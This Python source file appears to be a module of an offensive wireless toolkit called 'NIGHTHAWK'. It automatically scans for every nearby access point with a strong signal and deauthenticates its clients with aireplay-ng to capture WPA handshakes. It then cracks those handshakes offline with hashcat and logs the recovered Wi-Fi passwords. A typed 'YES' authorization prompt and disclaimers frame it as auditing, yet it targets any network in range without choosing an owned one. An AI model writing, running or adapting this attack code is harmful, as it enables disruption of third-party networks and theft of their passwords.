import subprocess
import os
import time
import csv
import sys
import shutil
import threading
from pathlib import Path

from core.ui import UI, Spinner, C, W, R, G, B, NC, Y, D
from modules.cracking import HandshakeCracker


class EncryptionAttack:
    """
    Automated handshake capture and password strength auditing module.

    This module is intended ONLY for:
    - Wireless networks you own, or
    - Networks where you have explicit, written authorization to test.

    It automates:
    - Discovery of nearby access points
    - Handshake capture
    - Optional background cracking (where hashcat is available)
    """

    def __init__(self, interface, bands, proj_dir):
        self.iface = interface
        self.bands = bands
        self.path = Path(proj_dir)
        self.targets = {}
        self.active = False
        self.loot_count = 0
        self.cracked_count = 0
        self.cracker = HandshakeCracker(self.path)
        self.notifications = []

    def _authorization_prompt(self):
        """
        Strong authorization reminder and confirmation.
        """
        UI.print_box(
            [
                "This module performs automated WPA/WPA2 handshake capture and",
                "optional password strength auditing using offline cracking.",
                "",
                "Use ONLY on networks you own or are explicitly authorized to",
                "assess in writing. Misuse may be illegal and is strongly",
                "discouraged.",
            ],
            title="AUTHORIZED USE ONLY",
        )

        confirm = input(
            f"\n{Y}Type 'YES' to confirm you are authorized "
            f"to run this in your environment: {NC}"
        ).strip()

        if confirm != "YES":
            print(f"\n{R}[!] Authorization not confirmed. Aborting module.{NC}")
            time.sleep(1.5)
            return False

        return True

    def _check_dependencies_linux(self):
        """
        Check for core tools on Linux before starting automated capture.

        Tools:
        - airodump-ng
        - aireplay-ng
        - aircrack-ng
        """
        required = ["airodump-ng", "aireplay-ng", "aircrack-ng"]
        missing = [t for t in required if shutil.which(t) is None]

        if missing and sys.platform == "linux":
            UI.print_box(
                [
                    "Missing wireless tools detected:",
                    ", ".join(missing),
                    "",
                    "Install aircrack-ng suite (and related tools) to use the",
                    "full automated capture functionality.",
                ],
                title="DEPENDENCY WARNING",
            )
            return False

        return True

    def check_buffer_health(self):
        """
        v62.0 Logic: Prevents RTL8187 buffer stalls during active injection.

        If TX failure patterns are seen, the interface is cycled.
        """
        if sys.platform == "linux":
            try:
                result = subprocess.check_output(
                    f"iw dev {self.iface} station dump",
                    shell=True,
                    stderr=subprocess.DEVNULL,
                )
                if b"tx failed" in result.lower():
                    # Attempt to self-heal the interface state
                    subprocess.run(
                        f"ip link set {self.iface} down",
                        shell=True,
                    )
                    subprocess.run(
                        f"ip link set {self.iface} up",
                        shell=True,
                    )
                    return False  # Indicate reset happened
            except Exception:
                pass
        return True

    def monitor_stream(self):
        """
        Asynchronous traffic parser for discovering nearby access points.

        On Linux:
            - Runs airodump-ng with CSV export and parses live results.
        On Windows/macOS:
            - No injection / driver-level calls are made (module exits).
        """
        tmp = self.path / "predator_live"

        # Safe cleanup of previous run artifacts
        for f in self.path.glob("predator_live*"):
            try:
                f.unlink()
            except Exception:
                pass

        if sys.platform != "linux":
            # Active wireless injection and airodump parsing are Linux-only
            return

        # airodump-ng CSV output for AP discovery
        cmd = (
            f"airodump-ng --band {self.bands} --wps --ignore-negative-one "
            f"-w {tmp} --output-format csv {self.iface}"
        )
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        while self.active:
            # 1. Run health check
            self.check_buffer_health()

            # 2. Parse CSV data
            csv_file = self.path / "predator_live-01.csv"
            if csv_file.exists():
                try:
                    with open(
                        csv_file,
                        "r",
                        encoding="utf-8",
                        errors="ignore",
                    ) as f:
                        lines = f.readlines()
                        for line in lines:
                            r = line.split(",")
                            if (
                                len(r) > 13
                                and r[0] != "BSSID"
                                and r[0].strip()
                            ):
                                bssid = r[0].strip()
                                essid = r[13].strip() or "<Hidden>"
                                try:
                                    pwr = int(r[8].strip())
                                    # Only consider reasonably strong signals
                                    if pwr > -80 and bssid not in self.targets:
                                        self.targets[bssid] = essid
                                        # Start a capture workflow in background
                                        threading.Thread(
                                            target=self.kill_chain,
                                            args=(bssid, r[3].strip(), essid),
                                            daemon=True,
                                        ).start()
                                except Exception:
                                    pass
                except Exception:
                    pass
            time.sleep(5)

        try:
            proc.terminate()
        except Exception:
            pass

    def kill_chain(self, bssid, ch, essid):
        """
        Automated handshake capture and optional password strength check.

        Steps:
        1. Capture handshake for a target BSSID/channel using airodump-ng.
        2. Trigger deauthentication frames using aireplay-ng to stimulate
           handshake generation.
        3. Verify handshake with aircrack-ng.
        4. If valid, convert to hashcat format and attempt offline cracking
           using a generated wordlist and hashcat (if installed).
        """
        safe_essid = essid.replace(" ", "_").replace("/", "")
        cap_file = self.path / f"AUTO_{safe_essid}"

        # 1. Capture handshake
        cmd_sniff = (
            f"airodump-ng -c {ch} --bssid {bssid} -w {cap_file} {self.iface}"
        )
        sniff = subprocess.Popen(
            cmd_sniff,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # 2. High-intensity deauth (Linux-only)
        subprocess.run(
            f"aireplay-ng -0 5 -a {bssid} --ignore-negative-one {self.iface}",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(15)
        sniff.terminate()

        # 3. Verify handshake
        final_cap = self.path / f"AUTO_{safe_essid}-01.cap"
        if final_cap.exists():
            if shutil.which("aircrack-ng"):
                result = subprocess.run(
                    f"aircrack-ng {final_cap}",
                    shell=True,
                    capture_output=True,
                    text=True,
                )
                if "1 handshake" in result.stdout:
                    self.loot_count += 1

                    # 4. Background cracking (if hashcat is available)
                    hc_file = self.cracker.convert_to_hashcat(str(final_cap))
                    if hc_file:
                        wlist = self.cracker.generate_warp_list(essid)
                        pot = self.path / f"auto_{safe_essid}.pot"

                        if shutil.which("hashcat"):
                            subprocess.run(
                                (
                                    "hashcat -m 22000 -a 0 "
                                    f"{hc_file} {wlist} "
                                    f"--outfile={pot} "
                                    "--outfile-format=2 --force"
                                ),
                                shell=True,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                            )

                            if pot.exists() and pot.stat().st_size > 0:
                                with open(pot, "r", encoding="utf-8") as f:
                                    pw = f.read().strip()
                                self.cracked_count += 1
                                self.cracker.save_success(pw)

                                alert = (
                                    f"{G}[!] PASSWORD RECOVERED "
                                    f"(strength audit): {essid} -> {pw}{NC}"
                                )
                                self.notifications.append(alert)

                                with open(
                                    self.path / "SUCCESS_LOG.txt",
                                    "a",
                                    encoding="utf-8",
                                ) as log:
                                    log.write(
                                        f"[{time.strftime('%H:%M:%S')}] "
                                        f"{essid}: {pw}\n"
                                    )
                                pot.unlink()

    def run(self):
        UI.banner()
        UI.print_box(
            [
                f"INTERFACE: {self.iface}",
                "MODE     : AUTOMATED HANDSHAKE CAPTURE",
                "LOGS     : SUCCESS_LOG.txt",
            ],
            title="NIGHTHAWK v62.0",
        )

        # Platform notice
        if sys.platform != "linux":
            print(f"\n{Y}[!] NOTICE: Wi‑Fi injection features are Linux-only.{NC}")
            print(
                f"{D}    This module will not perform active deauth/capture on "
                f"Windows/macOS.{NC}"
            )

        # Authorization gate
        if not self._authorization_prompt():
            return

        # Dependency check (Linux only)
        if sys.platform == "linux" and not self._check_dependencies_linux():
            proceed = input(
                f"\n{Y}Dependencies missing. Continue anyway (limited "
                f"functionality)? [y/N]: {NC}"
            ).strip().lower()
            if proceed != "y":
                return

        self.active = True
        threading.Thread(target=self.monitor_stream, daemon=True).start()

        try:
            while True:
                # Simple dashboard status line
                print(
                    f"\r {C}[*] HANDSHAKES: {G}{self.loot_count}{NC} "
                    f"| {C}RECOVERED: {G}{self.cracked_count}{NC} "
                    f"| {W}Running capture workflow...{NC}",
                    end="",
                )

                if self.notifications:
                    print(f"\n\n {self.notifications.pop(0)}")
                    print(f" {W}Continuing capture and analysis...{NC}")

                time.sleep(1)
        except KeyboardInterrupt:
            self.active = False
            print(f"\n\n{Y}[!] Capture sequence terminated by operator.{NC}")
